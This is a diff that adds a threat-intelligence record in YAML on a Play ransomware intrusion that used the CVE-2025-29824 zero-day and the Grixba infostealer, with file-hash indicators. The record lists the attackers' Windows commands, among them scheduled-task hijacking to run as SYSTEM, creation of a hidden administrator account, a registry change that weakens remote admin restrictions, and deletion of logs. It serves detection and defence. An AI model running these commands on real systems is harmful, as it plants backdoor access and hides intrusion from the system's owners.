@@ -1,0 +1,101 @@
+summary: "Ransomware attackers, linked to the Play ransomware operation (Balloonfly), deployed a zero-day privilege escalation exploit targeting CVE-2025-29824 and the Grixba infostealer prior to patching. The attack occurred against an organization in the U.S."
+date: "April 8, 2025"
+authors: []
+attribution: "Balloonfly (linked to Play ransomware operation)"
+malware_families:
+  - Grixba
+  - PlayCrypt
+TTPs:
+  processs:
+    - powershell.exe
+    - schtasks.exe
+    - cmd.exe
+    - net.exe
+    - reg.exe
+  commandline:
+    - "powershell Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties *|select comment, description, Name, DNSHostName, OperatingSystem, LastLogonDate, ipv4address | Export-CSV C:\\Users\\\[REDACTED]\\Music\\AllWindows.csv -NoTypeInformation -Encoding UTF8"
+    - "schtasks /Query /xml /TN \\Microsoft\\Windows\\Wininet\\CacheTask > C:\\ProgramData\\CacheTask.xml"
+    - "schtasks /Change /RU SYSTEM /TN \\Microsoft\\Windows\\Wininet\\CacheTask /TR C:\\ProgramData\\servtask.bat"
+    - "schtasks /Run /TN \\Microsoft\\Windows\\Wininet\\CacheTask"
+    - "net user /add LocalSvc Dc_34%gfE62cvsa"
+    - "powershell.exe \"Add-LocalGroupMember -SID \"S-1-5-32-544\" -Member \"LocalSvc\"\""
+    - "net localgroup Administrators LocalSvc /add"
+    - "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
+    - "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v LocalSvc" /d 0 /t REG_DWORD"
+    - "icacls C:\\ProgramData\\Events /grant Everyone:F /inheritance:e /T"
+    - "call C:\\ProgramData\\cmdpostfix.bat"
+    - "timeout /t 3600"
+    - "sc stop StorSvc"
+    - "sc start StorSvc"
+    - "del C:\\ProgramData\\Events\\Errors.evt"
+    - "del C:\\ProgramData\\Events\\Logs.evt"
+    - "del C:\\ProgramData\\Events\\Jobs.evt"
+    - "del C:\\ProgramData\\Events\\Tmp.evt"
+    - "del C:\\ProgramData\\Events\\out.zip"
+    - "schtasks /Create /F /xml C:\\ProgramData\\CacheTask.xml /TN \\Microsoft\\Windows\\Wininet\\CacheTask"
+    - "rmdir C:\\ProgramData\\Events"
+    - "del C:\\ProgramData\\CacheTask.xml"
+    - "del C:\\ProgramData\\cmdpostfix.bat"
+    - "del C:\\ProgramData\\servtask.bat"
+    - "schtasks /Query /xml /TN \\Microsoft\\Windows\\Wininet\\CacheTask > C:\\ProgramData\\CacheTask.xml"
+    - "schtasks /Change /RU SYSTEM /TN \\Microsoft\\Windows\\Wininet\\CacheTask /TR C:\\ProgramData\\servtask.bat"
+
+  powershell:
+    - Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties *|select comment, description, Name, DNSHostName, OperatingSystem, LastLogonDate, ipv4address | Export-CSV C:\Users\[REDACTED]\Music\AllWindows.csv -NoTypeInformation -Encoding UTF8
+    - Add-LocalGroupMember -SID "S-1-5-32-544" -Member "LocalSvc"
+
+  registry_keys:
+    - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+    - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList
+
+  persistence:
+    - Description: The attackers created scheduled tasks to execute batch files for privilege escalation and cleanup.
+    - Subkeys:
+      - schtasks /Create /F /xml C:\\ProgramData\\CacheTask.xml /TN \\Microsoft\\Windows\\Wininet\\CacheTask
+      - schtasks /Change /RU SYSTEM /TN \\Microsoft\\Windows\\Wininet\\CacheTask /TR C:\\ProgramData\\servtask.bat
+      - schtasks /Run /TN \\Microsoft\\Windows\\Wininet\\CacheTask
+
+  pipes: []
+
+  process_relations: []
+
+---
+summary: "Ransomware attackers leveraged a privilege escalation zero-day (CVE-2025-29824) to deploy the Grixba infostealer and gain access to an organization in the U.S. The attack occurred before the vulnerability was patched."
+date: "April 8, 2025"
+authors: []
+attribution: "Balloonfly (linked to Play ransomware operation)"
+malware_families:
+  - Grixba
+  - PlayCrypt
+IOCs:
+  - hash: 6030c4381b8b5d5c5734341292316723a89f1bdbd2d10bb67c4d06b1242afd05
+    file: gt_net.exe
+    description: Infostealer.Grixba
+  - hash: 858efe4f9037e5efebadaaa70aa8ad096f7244c4c4aeade72c51ddad23d05bfe
+    file: go.exe
+    description: CVE-2025-29824 exploit
+  - hash: 9c21adbcb2888daf14ef55c4fa1f41eaa6cbfbe20d85c3e1da61a96a53ba18f9
+    file: clssrv.inf
+    description: Exploit DLL payload
+  - hash: 6d7374b4f977f689389c7155192b5db70ee44a7645625ecf8163c00da8828388
+    file: cmdpostfix.bat
+    description: Batch file
+  - hash: b2cba01ae6707ce694073018d948f82340b9c41fb2b2bc49769f9a0be37071e1
+    file: servtask.bat
+    description: Batch file
+  - hash: 293b455b5b7e1c2063a8781f3c169cf8ef2b1d06e6b7a086b7b44f37f55729bd
+    file: paloaltoconfig.dll
+    description: Unknown file
+  - hash: af260c172baffd0e8b2671fd0c84e607ac9b2c8beb57df43cf5df6e103cbb7ad
+    file: paloaltoconfig.exe
+    description: Unknown file
+  - hash: 430d1364d0d0a60facd9b73e674faddf63a8f77649cd10ba855df7e49189980b
+    file: 1day.exe
+    description: Unknown file
+  - hash: ba05d05d51d4f7bfceb3821a3754e7432248f5c3d5a450391a0631d56bbce4c2
+    file: fappsettingslib.dll
+    description: Unknown file
+  - hash: b3ee068bf282575ac7eb715dd779254889e0b8a55aba2b7a1700fc8aa4dcb1da
+    file: w64stdlib.dll
+    description: Unknown file
+reference: https://www.security.com/threat-intelligence/play-ransomware-zero-day
